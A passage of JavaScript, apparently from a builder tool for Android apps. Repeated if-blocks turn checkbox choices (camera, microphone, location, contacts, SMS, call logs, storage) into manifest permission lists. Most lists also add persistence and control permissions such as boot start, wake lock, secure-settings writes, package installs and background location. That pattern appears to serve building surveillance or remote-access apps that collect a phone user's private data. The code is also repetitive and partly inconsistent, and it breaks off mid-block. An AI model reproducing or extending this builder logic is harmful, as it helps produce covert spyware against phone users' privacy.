          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/> ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }



          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
        //if four are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
